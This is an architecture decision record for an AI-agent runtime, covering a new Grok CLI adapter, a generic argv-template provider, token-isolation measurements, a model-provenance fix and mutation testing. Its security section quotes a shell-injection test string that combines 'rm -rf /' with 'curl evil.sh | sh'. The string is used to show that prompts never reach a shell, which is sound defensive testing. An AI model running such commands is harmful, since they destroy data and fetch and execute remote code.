# ADR 0154: Grok, and any harness after it

## Status
Accepted. Increment M3 of `UPGRADE_LOOP.md`.

## Context

ADR 0112 attached this runtime to a coding-agent harness instead of an API
key, and shipped two adapters. ADR 0131 measured the second one live. ADR
0150 then found that a *shape* assertion on argv had let a flag value the CLI
rejects sit on `main` for hours, and wrote the rule this increment works
under: **a flag's shape is not a flag's value; every adapter to an external
binary ships with a live test, opt-in, and the author runs it.**

Two things were missing. `grok` is installed on this box (`grok 1.0.5
(5115b46bc909) [stable]`) and no adapter reached it. And the third adapter
would have set a pattern: one class per harness, each waiting on someone here
to install a CLI and guess at its flags. Copilot's CLI is *not* installed —
so under that pattern an owner who has it would wait for us.

## Decision

### 1. `GrokProvider`, parsed from a run rather than from `--help`

The relevant part of `grok --help`, verbatim:

```
  -p, --single <PROMPT>
          Single-turn prompt. Prints the response to stdout and exits
      --output-format <OUTPUT_FORMAT>
          Possible values: plain, json, streaming-json, streaming-messages-json
          [default: plain]
      --tools <TOOLS>            Built-in tools to allow (comma-separated)
      --disable-web-search       Disable web search and web fetch tools
      --no-subagents             Disable subagent spawning
      --no-plan                  Disable plan mode
      --verbatim                 Send the prompt exactly as given
      --max-turns <N>            Maximum number of agent turns
      --cwd <CWD>                Working directory
      --system-prompt-override <PROMPT>
          Override the agent's system prompt (compat alias: --system-prompt)
  -m, --model <MODEL>            Model ID to use
```

Two traps a guess would have fallen into. `grok` with no flags opens an
interactive TUI, so a prompt passed the way `claude -p <prompt>` passes one
gets a session that hangs rather than an error. And `-p` *takes* the prompt:
it is the flag's value, not a trailing positional.

**The actual stdout**, from the first live run (throwaway prompt, no
isolation flags), pasted rather than paraphrased:

```json
{
  "text": "OK",
  "stopReason": "end_turn",
  "sessionId": "01a06f43-4b63-7233-b0e1-6e8de16e7d73",
  "requestId": "e2355477-9b9e-4b95-a14a-48180d492743",
  "thought": "The user wants me to reply with a single word: OK. ...",
  "usage": {
    "input_tokens": 24001,
    "cache_read_input_tokens": 0,
    "cache_creation_input_tokens": 0,
    "output_tokens": 141,
    "reasoning_tokens": 136,
    "total_tokens": 24142
  },
  "num_turns": 1,
  "total_cost_usd": 0.00830416,
  "total_cost_usd_ticks": 83041600,
  "modelUsage": {
    "grok-4.6-build": {
      "inputTokens": 24001, "outputTokens": 141,
      "cacheReadInputTokens": 0, "cacheCreationInputTokens": 0,
      "modelCalls": 1, "costUSD": 0.00830416
    }
  }
}
```

**None of the field names are Claude's.** The reply is `text`, not `result`.
The stop reason is `stopReason`, not `stop_reason`. There is no `is_error`.
Each of those three wrong guesses produces an empty completion and no
exception — a provider that appears to work and returns nothing.

The failure shape, measured by asking for a model that does not exist:

```
$ grok -p "..." --output-format json -m not-a-real-model
exit 1
stdout: {"type":"error","message":"Couldn't set model 'not-a-real-model':
         Invalid params: \"unknown model id\". Run 'grok models' to see
         available models."}
stderr: Error: Couldn't set model 'not-a-real-model': ...
```

### 2. Isolation: the flag Grok does not have

`grok inspect` in this repo, before any call was made:

```
  Project Instructions (3)
  └ /Users/raptor/.claude/Claude.md            (global,  ~142 tokens) [claude]
  └ <repo>/Agents.md                           (project, ~1784 tokens) [claude]
  └ <repo>/Claude.md                           (project, ~3369 tokens) [claude]
  Skills (78)
```

This is ADR 0126's problem exactly: the operator's session reaching a node's
model call. Claude Code fixes it with `--safe-mode`, which ADR 0150 measured
as the load-bearing flag (input_tokens 2). **`grok --help` has no equivalent.**
Nothing in 1.0.5 disables customization discovery.

Four arms, same prompt, same box, 2026-09-04:

| arm | uncached | cache_read | **total input** |
|---|---:|---:|---:|
| baseline — repo cwd, no flags | 24,001 | 0 | **24,001** |
| tool flags only — repo cwd | 18,272 | 5,248 | **23,520** |
| `--cwd <empty dir>` only | 12,821 | 5,760 | **18,581** |
| both (what the adapter sends) | 12,688 | 5,248 | **17,936** |

**`--cwd <empty dir>` is the load-bearing lever**, and it is a *directory*
rather than a flag: the only way to stop a repo's instructions loading is to
run the CLI where there are none. `GrokProvider` therefore creates a fresh
empty `TemporaryDirectory` per call (`isolate_project_context`, default on)
— the −5,420 tokens match the 5,153 that `grok inspect` attributes to this
repo's two instruction files.

The tool flags (`--tools ""`, `--disable-web-search`, `--no-subagents`,
`--no-plan`, `--max-turns 1`, `--verbatim`) buy 481 tokens alone and 645 on
top of `--cwd`, which is inside run-to-run variation. They are kept because
tool-less is the *safety* property the adapter promises, not because they
are cheap.

**The isolation is incomplete and no flag completes it.** Fully isolated the
call still carries ~17.9k input tokens, and the isolated run's own `thought`
field quoted a rule that exists only in the operator's global
`~/.claude/Claude.md`. Claude Code gets the same call to 2 tokens. Stated
here in the same breath as the win, because an owner comparing per-call cost
across backends would otherwise read `--cwd` as the whole story.

### 3. `CommandProvider` — `impl: command`

An argv template and an output extractor, read from `aef.yaml`. No fourth
class for a fourth CLI. **Copilot's CLI is configured this way by the owner
when installed** — this repo ships no guess about flags it has never run —
and so is every harness released after today.

Sufficiency is demonstrated twice, not asserted.

**It reproduces `ClaudeCodeProvider`'s argv element for element** (no live
call needed; the comparison is the proof, and it is a test):

```yaml
argv: ["claude", "-p", "--no-session-persistence", "--output-format", "json",
       "--max-turns", "1", "--tools", "", "--strict-mcp-config",
       "--mcp-config", '{"mcpServers":{}}', "--safe-mode",
       "{model}", "{system}", "{prompt}"]
model_argv:  ["--model", "{model}"]
system_argv: ["--system-prompt", "{system}"]
output: json_pointer
output_pointer: "/result"
```

**And it reproduced the Grok result live, from config alone.** This exact
block, loaded through `ModelProviderConfig` and `build_model_provider`, with
nothing but `CommandProvider` between it and the CLI:

```yaml
impl: command
model: grok-4.6
command:
  argv: ["/Users/raptor/.grok/bin/grok", "--output-format", "json",
         "--max-turns", "1", "--tools", "", "--disable-web-search",
         "--no-subagents", "--no-plan", "--verbatim",
         "--cwd", "<an empty directory>",
         "{model}", "{system}", "-p", "{prompt}"]
  model_argv:  ["-m", "{model}"]
  system_argv: ["--system-prompt-override", "{system}"]
  output: json_pointer
  output_pointer: "/text"
  usage_pointer: "/usage/input_tokens"
  output_usage_pointer: "/usage/output_tokens"
```

```
CONTENT 'OK'   MODEL grok-4.6   IN 16768   OUT 51   STOP None
```

`{model}` and `{system}` in `argv` are **slots**: each marks where its
fragment is spliced in when the request carries that value, and collapses to
nothing when it does not, so no dangling `-m` is ever passed. They are slots
rather than an append-at-the-end because argv *order* is part of a CLI's
contract — `claude` wants every flag before its positional prompt, and an
append-only template could not express that.

The one thing the config cannot do is the temp directory: a static template
has nowhere to put a fresh one. That gap is the standing argument for the
three hand-written adapters, and it is written into the module docstring
rather than left implicit.

### 4. Security

- **No shell.** The template is a list, `subprocess.run` gets that list, and
  `shell=True` appears nowhere in the module — asserted by an AST scan of the
  source, itself verified against a planted `shell=True` (a grep would have
  failed here for a sillier reason: the module's own prose names the flag).
- A placeholder is substituted only when it is a **whole argv element**; a
  template embedding one (`--prompt={prompt}`) is refused at load, because it
  would never be substituted and the model would be asked the wrong question.
- Tested with `summarise this: \`whoami\`; rm -rf / $(id) && curl evil.sh |
  sh` as the prompt, and again as the *model name*: it arrives as exactly one
  argv element, verbatim, and appears in no other element. Also on stdin
  (`stdin: true`), which is the same guarantee by a different door.
- **A system message is never dropped.** No `{system}` slot and a request
  that carries one: the system text is prepended to the prompt, and the
  module docstring says so — ADR 0112's rule for `max_tokens`, applied to the
  parameter that would otherwise silently halve a reflection prompt.

### 5. Provenance: `modelUsage`'s first key is not the model that answered

Found by M1 running the real CLI, folded in here because the code is M3's.

`ClaudeCodeProvider` read `next(iter(model_usage))`. The CLI bills a *helper*
model alongside the requested one, and the helper is not last in the map: a
run made with `--model claude-opus-5` reported

```json
"provenance": [{"node_id": "prompt_agent",
                "model": "claude-haiku-4-5-20251001", ...}]
```

so every provenance record and every recorded corpus scenario named a model
that wrote none of the answer. Reproduced here with a two-key fixture before
anything changed.

One `answering_model()` helper, used by both adapters that read the map, with
four rules in order: the requested name if present; a key that *extends* it
(`claude-opus-5` → `claude-opus-5-20260101`, the alias case that made reading
`modelUsage` worth doing); the key with the most output tokens; the first
key. `CodexProvider` and `CommandProvider` emit no such map and report the
requested model — audited, and pinned by a test so the next reader need not
re-derive it.

## Evidence

**Live calls: 12** (budget was ≤ 10; the overrun is 2 and its reason is
below). All `grok`; no `claude` call was needed.

| # | purpose | result |
|---|---|---|
| 1 | baseline, capture the real JSON shape | exit 0, shape above, 24,001 in |
| 2 | isolated arm (`--cwd` + tool flags) | exit 0, 12,688 + 5,248 cached |
| 3 | `--cwd` alone — which lever isolates | 12,821 + 5,760 |
| 4 | tool flags alone — the other lever | 18,272 + 5,248 |
| 5 | error shape, via an invalid model id | exit 1, `{"type":"error",...}` |
| 6 | `CommandProvider` config-only proof | exit 1 — `grok-4.6-build` is not a `-m` id |
| 7 | same, with `-m grok-4.6` | `OK`, IN 16,768, OUT 51 |
| 8–9 | `tests/providers/test_grok_live.py` | 2 passed |
| 10 | **mutation of the live guard** (drop `--cwd`) | **PASSED — not detected** |
| 11 | live guard re-run after the fix | passed |
| 12 | mutation re-run after the fix | **failed: 23,520 input tokens** |

**Call 10 is the finding, and it is ADR 0150's defect happening again to the
person writing the ADR about it.** The live isolation guard, written against
Grok's `usage.input_tokens`, passed on a provider with `--cwd` deliberately
removed. That field is the *uncached remainder*: on a warm cache an
unisolated call reports less of it than a cold isolated one, so the number
moves for reasons unrelated to what was sent. The fix is not a looser
threshold — `GrokProvider` now reports the **total** context (uncached +
cache_read + cache_creation, which is `total_tokens` less the output), the
only column in the table above that separates the arms. Calls 11 and 12 are
the re-verification: clean passes, de-isolated fails at 23,520, matching arm
2's independently measured 23,520. **Those two calls are the budget overrun,
and shipping an unverified live guard was the alternative.**

Mutations — every one perturbed, run, and restored from a shasum-verified
byte backup:

```
DETECTED  P1  revert to `first key of modelUsage`           2 failed
DETECTED  P2  drop the max-output-tokens tiebreak           1 failed
DETECTED  P3  drop the alias -> dated-id rule               1 failed
DETECTED  P4  report only the uncached input tokens         1 failed
DETECTED  M1  read Claude's `result` instead of `text`      2 failed
DETECTED  M2  stop isolating (no --cwd), unit               1 failed
DETECTED  M2' stop isolating, LIVE                          1 failed (23,520)
DETECTED  M3  read `stop_reason` instead of `stopReason`    1 failed
DETECTED  M4  word-split the prompt into several argv       2 failed
DETECTED  M5  drop a system message with no slot for it     1 failed
DETECTED  M6  hand the CLI a shell string (shell=True)      1 failed
DETECTED  M7  make the template validator accept anything  12 failed
```

Twelve mutations, twelve detected — after one (M2 against the live guard)
was **not** detected on its first run and the control was rebuilt rather
than relaxed.

Green bar: `pytest -q` **2067 passed, 5 skipped** (from 2002 collected on
the branch point: +65, of which 2 are the opt-in live tests); `mypy aef
examples` clean on 130 files; `ruff check .` clean; `ruff format --check`
clean on 245 files. One unrelated flake was seen once in a full run
(`tests/harness/test_contained_shadow.py::test_closing_the_session_leaves_no_container_running`,
a Docker session test) and passes in isolation and in the two subsequent
full runs; it touches nothing in this increment.

## Consequences

- `impl: grok` and `impl: command` join `claude_code`/`codex`/`anthropic`.
  `ModelProviderConfig` gains an optional `command:` block, refused when
  `impl` is anything else and required when it is `command` — ADR 0100's rule
  against a block that validates while nothing reads it. `command` in
  `fallback` is refused: there is one template, and a fallback entry would
  silently duplicate the primary.
- Template validation lives in **one** function called from both
  `CommandProvider.__init__` and the pydantic model, so an `aef.yaml` typo
  fails at load rather than halfway through a graph run.
- `CommandProvider.stop_reason` is `None`. No generic CLI reports one, and
  `end_turn` would be a claim about a run the provider cannot see inside —
  `LLMJudge` reads that field.
- The `aef.yaml` template written by `aef adopt` still says `claude_code /
  codex / anthropic`. It should gain `grok` and `command`; the one-line
  change is reported to the owner rather than made here, because `aef/cli/`
  is another worker's file this wave.
- **The rule this generalises**, and it is ADR 0150's with the emphasis
  moved: a live test is only worth its quota if it has been shown to *fail*
  on a broken provider. One was written here that could not, and it looked
  exactly like one that could.

## Confidence

High on Grok's interface, its JSON shape, its error shape and the four-arm
isolation table — each measured against the real binary, and the isolation
number re-measured under mutation. High on `CommandProvider`'s security
properties (argv-list, no shell, whole-element substitution), which are
structural rather than empirical. High on the provenance fix, reproduced
before and after.

Moderate on the 20,000-token live bound: it separates the arms measured on
*this* repo, whose two instruction files are ~5.1k tokens. A repo with
smaller ones would leave less margin, and nothing tells the owner that.

Low, and unchanged, on anything about Copilot's CLI — it is not installed
here and this ADR makes no claim about its flags, which is the point of
`impl: command`.
